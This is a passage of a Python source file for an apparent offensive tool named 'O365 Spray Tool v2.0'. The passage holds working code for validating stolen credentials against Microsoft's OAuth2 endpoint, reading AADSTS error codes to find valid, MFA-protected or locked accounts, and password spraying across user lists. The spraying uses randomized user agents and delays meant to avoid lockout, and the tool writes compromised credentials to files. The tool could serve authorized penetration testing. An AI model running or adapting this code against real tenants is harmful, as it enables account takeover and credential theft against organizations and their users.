                print("💡 Use -o <filename> to save detailed JSON and summary reports")
                print("💡 Use -v for verbose output with all details")
                print("="*60)

            # Final verdict
            self._log("\n" + "="*60)
            if results['is_o365']:
                self._log(f"RESULT: {domain} IS using Office 365", 'success')
                if self.tenant_id:
                    self._log(f"Tenant ID: {self.tenant_id}", 'success')
            else:
                self._log(f"RESULT: {domain} is NOT using Office 365", 'error')
            self._log("="*60)

            return results

class O365Validator:
    """Credential validation against O365"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        return random.choice(agents)

    def validate_credential(self, username: str, password: str) -> Tuple[bool, str, Dict]:
        """
        Validate O365 credentials via OAuth2 token endpoint
        Returns: (success, message, details)
        """
        url = 'https://login.microsoftonline.com/common/oauth2/token'

        headers = {
            'User-Agent': self._random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json'
        }

        # Using Azure AD PowerShell client ID
        data = {
            'resource': 'https://graph.windows.net',
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
            'grant_type': 'password',
            'username': username,
            'password': password,
            'scope': 'openid'
        }

        try:
            resp = self.session.post(url, headers=headers, data=data, timeout=30)

            details = {
                'status_code': resp.status_code,
                'username': username,
                'timestamp': datetime.now().isoformat()
            }

            if resp.status_code == 200:
                # Valid credentials
                token_data = resp.json()
                details['access_token'] = token_data.get('access_token', '')[:50] + '...'
                details['token_type'] = token_data.get('token_type', '')
                return True, "VALID_CREDS", details

            else:
                # Parse error response
                try:
                    error_data = resp.json()
                    error_code = error_data.get('error', '')
                    error_desc = error_data.get('error_description', '')

                    # Parse common error codes
                    if 'AADSTS50126' in error_desc:
                        # Invalid username or password
                        return False, "INVALID_CREDS", details
                    elif 'AADSTS50053' in error_desc:
                        # Account locked
                        return False, "ACCOUNT_LOCKED", details
                    elif 'AADSTS50055' in error_desc:
                        # Password expired (but creds are valid)
                        return True, "PASSWORD_EXPIRED", details
                    elif 'AADSTS50057' in error_desc:
                        # Account disabled
                        return False, "ACCOUNT_DISABLED", details
                    elif 'AADSTS50076' in error_desc or 'AADSTS50079' in error_desc:
                        # MFA required (creds are valid)
                        return True, "VALID_MFA_REQUIRED", details
                    elif 'AADSTS50158' in error_desc:
                        # Conditional Access policy (creds likely valid)
                        return True, "VALID_CONDITIONAL_ACCESS", details
                    elif 'AADSTS50034' in error_desc:
                        # User doesn't exist
                        return False, "USER_NOT_FOUND", details
                    elif 'AADSTS700016' in error_desc:
                        # Application not found in directory
                        return None, "APP_NOT_FOUND", details
                    elif 'AADSTS50128' in error_desc or 'AADSTS50059' in error_desc:
                        # Tenant doesn't exist
                        return None, "TENANT_NOT_FOUND", details
                    else:
                        details['error_code'] = error_code
                        details['error_description'] = error_desc
                        return None, f"UNKNOWN_ERROR: {error_code}", details

                except json.JSONDecodeError:
                    return None, f"HTTP_{resp.status_code}", details

        except requests.exceptions.RequestException as e:
            details['exception'] = str(e)
            return None, f"REQUEST_ERROR", details

    def validate_list(self, credentials: List[Tuple[str, str]],
                     delay: int = 0, output_file: Optional[str] = None) -> Dict:
        """
        Validate a list of username:password pairs
        """
        self._log(f"Starting validation of {len(credentials)} credential pairs")

        results = {
            'valid': [],
            'invalid': [],
            'errors': []
        }

        for idx, (username, password) in enumerate(credentials, 1):
            self._log(f"Testing {idx}/{len(credentials)}: {username}")

            success, message, details = self.validate_credential(username, password)

            if success is True:
                self._log(f"VALID: {username}:{password} - {message}", 'success')
                results['valid'].append({
                    'username': username,
                    'password': password,
                    'status': message
                })
            elif success is False:
                if self.verbose:
                    self._log(f"INVALID: {username} - {message}", 'error')
                results['invalid'].append({
                    'username': username,
                    'status': message
                })
            else:
                self._log(f"ERROR: {username} - {message}", 'warning')
                results['errors'].append({
                    'username': username,
                    'error': message
                })

            # Delay between attempts
            if idx < len(credentials) and delay > 0:
                time.sleep(delay)

        # Save results
        if output_file:
            self._save_results(results, output_file)

        # Summary
        self._log(f"\n{'='*60}")
        self._log(f"Validation Complete", 'success')
        self._log(f"Valid: {len(results['valid'])}")
        self._log(f"Invalid: {len(results['invalid'])}")
        self._log(f"Errors: {len(results['errors'])}")
        self._log(f"{'='*60}\n")

        return results

    def _save_results(self, results: Dict, output_file: str):
        """Save valid credentials to file"""
        try:
            with open(output_file, 'w') as f:
                for cred in results['valid']:
                    f.write(f"{cred['username']}:{cred['password']} - {cred['status']}\n")
            self._log(f"Valid credentials saved to: {output_file}", 'success')
        except Exception as e:
            self._log(f"Error saving results: {e}", 'error')


class O365Sprayer:
    """Password spraying with intelligent lockout avoidance"""

    def __init__(self, lockout_threshold: int = 5, lockout_window: int = 30,
                 delay_min: int = 2, delay_max: int = 5, verbose: bool = False):
        self.lockout_threshold = lockout_threshold
        self.lockout_window = lockout_window  # minutes
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.verbose = verbose
        self.validator = O365Validator(verbose=verbose)
        self.attempt_tracker = {}  # Track attempts per user

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def spray(self, usernames: List[str], passwords: List[str],
              count: int = 1, delay_spray: int = 30, output_file: Optional[str] = None) -> Dict:
        """
        Perform password spraying attack

        Args:
            usernames: List of usernames to test
            passwords: List of passwords to try
            count: Number of password attempts per user per round
            delay_spray: Minutes to wait between spray rounds
            output_file: File to save valid credentials
        """
        self._log(f"Starting password spray")
        self._log(f"Targets: {len(usernames)} users")
        self._log(f"Passwords: {len(passwords)}")
        self._log(f"Attempts per user per round: {count}")
        self._log(f"Delay between rounds: {delay_spray} minutes")

        results = {
            'valid': [],
            'invalid': [],
            'locked': [],
            'errors': []
        }

        # Group passwords into rounds based on count
        password_rounds = [passwords[i:i+count] for i in range(0, len(passwords), count)]

        for round_num, password_batch in enumerate(password_rounds, 1):
            self._log(f"\n{'='*60}")
            self._log(f"Round {round_num}/{len(password_rounds)}")
            self._log(f"Testing passwords: {', '.join(password_batch)}")
            self._log(f"{'='*60}\n")

            for password in password_batch:
                self._log(f"Spraying password: {password}")

                for idx, username in enumerate(usernames, 1):
                    # Skip if already found valid
                    if any(v['username'] == username for v in results['valid']):
                        if self.verbose:
                            self._log(f"Skipping {username} (already valid)", 'info')
                        continue

                    # Skip if locked out
                    if any(l['username'] == username for l in results['locked']):
                        if self.verbose:
                            self._log(f"Skipping {username} (locked out)", 'warning')
                        continue

                    self._log(f"[{idx}/{len(usernames)}] Testing: {username}")

                    success, message, details = self.validator.validate_credential(username, password)

                    if success is True:
                        self._log(f"SUCCESS: {username}:{password} - {message}", 'success')
                        results['valid'].append({
                            'username': username,
                            'password': password,
                            'status': message,
                            'round': round_num
                        })

                        # Save immediately
                        if output_file:
                            with open(output_file, 'a') as f:
                                f.write(f"{username}:{password}\n")

                    elif success is False:
                        if message == "ACCOUNT_LOCKED":
                            self._log(f"LOCKED: {username}", 'warning')
                            results['locked'].append({'username': username})
                        else:
                            if self.verbose:
                                self._log(f"INVALID: {username} - {message}", 'error')
                            results['invalid'].append({
                                'username': username,
                                'password': password,
                                'status': message
                            })
                    else:
                        if self.verbose:
                            self._log(f"ERROR: {username} - {message}", 'warning')
                        results['errors'].append({
                            'username': username,
                            'password': password,
                            'error': message
                        })

                    # Random delay between users
                    if idx < len(usernames):
                        delay = random.randint(self.delay_min, self.delay_max)
                        time.sleep(delay)

            # Delay between rounds
            if round_num < len(password_rounds):
                self._log(f"\n{'='*60}")
                self._log(f"Waiting {delay_spray} minutes before next round...")
                self._log(f"{'='*60}\n")
                time.sleep(delay_spray * 60)

        # Final summary
        self._log(f"\n{'='*60}")
        self._log(f"Password Spray Complete", 'success')
        self._log(f"Valid Credentials: {len(results['valid'])}")
        self._log(f"Locked Accounts: {len(results['locked'])}")
        self._log(f"Failed Attempts: {len(results['invalid'])}")
        self._log(f"Errors: {len(results['errors'])}")
        self._log(f"{'='*60}\n")

        if results['valid']:
            self._log("Valid Credentials Found:", 'success')
            for cred in results['valid']:
                self._log(f"  {cred['username']}:{cred['password']} - {cred['status']}")

        return results

def load_file(filepath: str) -> List[str]:
    """Load lines from a file, stripping whitespace and handling various encodings"""
    try:
        # Try UTF-8 first
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        # Fall back to latin-1 (which accepts all byte values)
        try:
            with open(filepath, 'r', encoding='latin-1') as f:
                lines = [line.strip() for line in f if line.strip()]
                print(f"[!] Warning: File {filepath} loaded with latin-1 encoding (non-UTF-8 characters found)")
                return lines
        except Exception as e:
            # Last resort: try with errors='ignore' to skip problematic characters
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f if line.strip()]
                    print(f"[!] Warning: File {filepath} loaded with UTF-8 (ignoring invalid characters)")
                    return lines
            except Exception as e2:
                print(f"[-] Error reading file {filepath}: {e2}")
                sys.exit(1)
    except FileNotFoundError:
        print(f"[-] Error: File not found: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading file {filepath}: {e}")
        sys.exit(1)

def parse_credentials(filepath: str) -> List[Tuple[str, str]]:
    """Parse username:password format from file"""
    creds = []
    lines = load_file(filepath)

    for line in lines:
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                creds.append((parts[0].strip(), parts[1].strip()))

    return creds

def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║                  O365 Spray Tool v2.0                      ║
    ║            Enumeration | Validation | Spraying            ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

    parser = argparse.ArgumentParser(
        description='O365 Password Spraying and Enumeration Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Validate domain uses O365 (with full reconnaissance)
  python3 o365_spray.py --validate -d target.com -o recon_report -v

  # Enumerate valid users
  python3 o365_spray.py --enum -u users.txt -d target.com -o valid_users.txt

  # Validate credentials from file
  python3 o365_spray.py --check-creds -c creds.txt -o valid_creds.txt

  # Password spray
  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o compromised.txt

  # Quick single password spray
  python3 o365_spray.py --spray -u users.txt -P 'Winter2024!' --count 1 --delay 30
        """
    )

    # Mode selection
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('--validate', action='store_true', help='Validate if domain uses O365 (includes full recon)')
    mode.add_argument('--enum', action='store_true', help='Username enumeration mode')
    mode.add_argument('--check-creds', action='store_true', help='Credential validation mode')
    mode.add_argument('--spray', action='store_true', help='Password spraying mode')

    # Input files
    parser.add_argument('-u', '--usernames', help='File containing usernames (one per line)')
    parser.add_argument('-p', '--passwords', help='File containing passwords (one per line)')
    parser.add_argument('-P', '--password', help='Single password to test')
    parser.add_argument('-c', '--credentials', help='File with username:password format')
    parser.add_argument('-d', '--domain', help='Domain for validation/enumeration (e.g., target.com)')

    # Enumeration options
    parser.add_argument('--method', choices=['office', 'activesync', 'onedrive'],
                       default='office', help='Enumeration method (default: office)')

    # Spray options
    parser.add_argument('--count', type=int, default=1,
                       help='Number of password attempts per user per round (default: 1)')
    parser.add_argument('--delay', type=int, default=30,
                       help='Minutes to wait between spray rounds (default: 30)')
    parser.add_argument('--delay-user', type=int, default=2,
                       help='Min seconds between users (default: 2)')
    parser.add_argument('--delay-user-max', type=int, default=5,
                       help='Max seconds between users (default: 5)')

    # Output
    parser.add_argument('-o', '--output', help='Output file for results')

    # General options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Validation mode - Check if domain uses O365 with full reconnaissance
    if args.validate:
        if not args.domain:
            parser.error("--validate requires -d/--domain")

        validator = O365DomainValidator(verbose=args.verbose)
        results = validator.validate_domain(args.domain)

        # Save results to JSON and summary
        if args.output:
            # Save JSON report
            json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
            try:
                with open(json_file, 'w') as f:
                    json.dump(results, f, indent=2)
                print(f"\n[+] JSON report saved to: {json_file}")
            except Exception as e:
                print(f"\n[-] Error saving JSON report: {e}")

            # Also save a human-readable summary
            txt_file = json_file.replace('.json', '_summary.txt')
            try:
                with open(txt_file, 'w') as f:
                    f.write(f"O365 Validation Report: {results['domain']}\n")
                    f.write(f"{'='*60}\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"{'='*60}\n\n")

                    f.write(f"Uses O365: {results['is_o365']}\n")
                    f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")

                    f.write("BASIC CHECKS:\n")
                    f.write("-" * 60 + "\n")
                    for check_name, check_data in results['checks'].items():
                        f.write(f"\n{check_name.upper()}:\n")
                        f.write(f"  Valid: {check_data.get('valid')}\n")
                        if 'message' in check_data:
                            f.write(f"  Message: {check_data['message']}\n")
                        if 'details' in check_data and check_data['details']:
                            f.write(f"  Details:\n")
                            for key, value in check_data['details'].items():
                                f.write(f"    {key}: {value}\n")

                    if 'reconnaissance' in results and results['reconnaissance']:
                        f.write(f"\n\n{'='*60}\n")
                        f.write("EXTENDED RECONNAISSANCE\n")
                        f.write(f"{'='*60}\n")

                        # Tenant Details
                        if 'tenant_details' in results['reconnaissance']:
                            tenant = results['reconnaissance']['tenant_details']
                            if 'openid_v2' in tenant:
                                f.write("\nTenant Configuration:\n")
                                f.write("-" * 40 + "\n")
                                for key, value in tenant['openid_v2'].items():
                                    if value:
                                        f.write(f"  {key}: {value}\n")

                        # Associated Domains
                        if 'associated_domains' in results['reconnaissance']:
                            domains = results['reconnaissance']['associated_domains']
                            if isinstance(domains, list):
                                f.write(f"\nAssociated Domains ({len(domains)}):\n")
                                f.write("-" * 40 + "\n")
                                for d in domains:
                                    f.write(f"  - {d}\n")

                        # Applications
                        if 'applications' in results['reconnaissance']:
                            apps = results['reconnaissance']['applications']
                            if isinstance(apps, dict):
                                f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
                                f.write("-" * 40 + "\n")

                                if apps.get('known_apps'):
                                    f.write("\nKnown Microsoft Applications:\n")
                                    for app in apps['known_apps']:
                                        f.write(f"  - {app['name']}\n")
                                        f.write(f"    Client ID: {app['client_id']}\n")

                                if apps.get('custom_apps'):
                                    f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
                                    for app in apps['custom_apps'][:10]:  # Top 10
                                        f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")

                        # Username Patterns
                        if 'username_patterns' in results['reconnaissance']:
                            patterns_data = results['reconnaissance']['username_patterns']
                            if isinstance(patterns_data, dict):
                                patterns = patterns_data.get('patterns', [])
                                f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
                                f.write("-" * 40 + "\n")
                                if patterns:
                                    for p in patterns[:10]:  # Top 10
                                        f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
                                        f.write(f"({p['matches']}/{p['attempts']} matches)\n")
                                else:
                                    f.write("  No patterns discovered with test names\n")

                        # Guest Access
                        if 'guest_access' in results['reconnaissance']:
                            guest = results['reconnaissance']['guest_access']
                            if isinstance(guest, dict):
                                f.write("\nGuest Access & Misconfigurations:\n")
                                f.write("-" * 40 + "\n")
                                f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")

                                if guest.get('external_domains_found'):
                                    f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
                                    for domain in guest['external_domains_found']:
                                        f.write(f"    - {domain}\n")

                                if guest.get('oauth_misconfigurations'):
                                    f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
                                    for misconfig in guest['oauth_misconfigurations']:
                                        f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
                                        f.write(f"{misconfig.get('description', 'N/A')} ")
                                        f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")

                    f.write(f"\n{'='*60}\n")
                    f.write("END OF REPORT\n")
                    f.write(f"{'='*60}\n")

                print(f"[+] Summary report saved to: {txt_file}")
            except Exception as e:
                print(f"\n[-] Error saving summary report: {e}")

        # Exit with appropriate code
        sys.exit(0 if results['is_o365'] else 1)

    # Enumeration mode
    elif args.enum:
        if not args.usernames or not args.domain:
            parser.error("--enum requires -u/--usernames and -d/--domain")

        usernames = load_file(args.usernames)
        enumerator = O365Enum(args.domain, verbose=args.verbose)
        results = enumerator.enumerate_users(
            usernames,
            method=args.method,
            delay=args.delay_user,
            output_file=args.output
        )

    # Credential validation mode
    elif args.check_creds:
        if not args.credentials:
            parser.error("--check-creds requires -c/--credentials")

        credentials = parse_credentials(args.credentials)
        if not credentials:
            print("[-] No valid credentials found in file (expected format: username:password)")
            sys.exit(1)

        validator = O365Validator(verbose=args.verbose)
        results = validator.validate_list(
            credentials,
            delay=args.delay_user,
            output_file=args.output
        )

    # Spray mode
    elif args.spray:
        if not args.usernames:
            parser.error("--spray requires -u/--usernames")

        if not args.passwords and not args.password:
            parser.error("--spray requires either -p/--passwords or -P/--password")

        usernames = load_file(args.usernames)

        if args.password:
            passwords = [args.password]
        else:
            passwords = load_file(args.passwords)

        sprayer = O365Sprayer(
            delay_min=args.delay_user,
            delay_max=args.delay_user_max,
            verbose=args.verbose
        )

        results = sprayer.spray(
            usernames,
            passwords,
            count=args.count,
            delay_spray=args.delay,
            output_file=args.output
        )


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        import traceback
        if '--verbose' in sys.argv or '-v' in sys.argv:
            traceback.print_exc()
        sys.exit(1)
